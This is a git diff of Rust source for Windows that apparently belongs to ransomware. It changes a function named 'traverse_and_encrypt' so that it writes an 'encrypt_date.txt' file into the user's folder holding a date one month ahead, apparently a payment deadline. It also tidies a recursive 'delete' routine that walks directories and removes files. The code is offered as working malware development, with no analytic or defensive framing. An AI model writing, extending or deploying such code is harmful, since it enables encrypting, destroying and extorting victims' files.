@@ -6,12 +6,17 @@ use std::ffi::CString;
 use std::ptr::null_mut;
 use std::str;
 use winapi::shared::minwindef::FILETIME;
+use winapi::um::fileapi::WriteFile;
 use winapi::um::fileapi::{CreateFileA, OPEN_ALWAYS};
 use winapi::um::fileapi::{DeleteFileA, FindFirstFileA, FindNextFileA};
-use winapi::um::handleapi::INVALID_HANDLE_VALUE;
-use winapi::um::minwinbase::WIN32_FIND_DATAA;
+use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
+use winapi::um::minwinbase::{SYSTEMTIME, WIN32_FIND_DATAA};
+use winapi::um::sysinfoapi::GetSystemTime;
 use winapi::um::winbase::GetUserNameA;
-use winapi::um::winnt::{FILE_ATTRIBUTE_DIRECTORY, HANDLE};
+use winapi::um::winnt::{
+    FILE_ATTRIBUTE_DIRECTORY, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_WRITE_DATA, GENERIC_ALL,
+    HANDLE,
+};
 // traverse_and_encrypt will populate this vector
 static mut VALID_EXTENSION_VEC: Vec<&str> = Vec::new();
 pub fn traverse_and_encrypt() {
@@ -73,19 +78,49 @@ pub fn traverse_and_encrypt() {
 
         let mut full_path = String::from("C:\\Users\\");
         full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
-        full_path.push_str("\\peter_yeet.peter");
+        full_path.push_str("\\encrypt_date.txt");
 
         let full_path: CString = CString::new(full_path).unwrap();
 
-        CreateFileA(
+        let date_file: HANDLE = CreateFileA(
             full_path.as_ptr(),
-            1,
-            1,
+            FILE_WRITE_DATA,
+            FILE_SHARE_READ,
             null_mut(),
             OPEN_ALWAYS,
-            0x80,
+            FILE_ATTRIBUTE_NORMAL,
             null_mut(),
         );
+
+        let mut current_time: SYSTEMTIME = SYSTEMTIME {
+            wYear: 0,
+            wMonth: 0,
+            wDayOfWeek: 0,
+            wDay: 0,
+            wHour: 0,
+            wMinute: 0,
+            wSecond: 0,
+            wMilliseconds: 0,
+        };
+        GetSystemTime(&mut current_time);
+
+        let mut write_buffer: Vec<u8> = Vec::new();
+        if current_time.wMonth == 12 {
+            current_time.wMonth = 1;
+        } else {
+            current_time.wMonth += 1;
+        }
+        write_buffer.push(current_time.wMonth as u8);
+        write_buffer.push(current_time.wDay as u8);
+        let mut written: u32 = 0;
+        WriteFile(
+            date_file,
+            write_buffer.as_ptr() as *const _,
+            2,
+            &mut written,
+            null_mut(),
+        );
+        CloseHandle(date_file);
     }
 }
 
@@ -246,9 +281,9 @@ fn delete(dir_name: CString) {
             cAlternateFileName: [0i8; 14],
         };
 
-        let mut hFind: HANDLE = INVALID_HANDLE_VALUE;
-        hFind = FindFirstFileA(dir_name.as_ptr(), &mut file_data);
-        if hFind == INVALID_HANDLE_VALUE {
+        let mut h_find: HANDLE = INVALID_HANDLE_VALUE;
+        h_find = FindFirstFileA(dir_name.as_ptr(), &mut file_data);
+        if h_find == INVALID_HANDLE_VALUE {
             // if path not valid, return
             return;
         }
@@ -289,7 +324,7 @@ fn delete(dir_name: CString) {
                 }
             }
 
-            if FindNextFileA(hFind, &mut file_data) == 0 {
+            if FindNextFileA(h_find, &mut file_data) == 0 {
                 return;
             }
         }
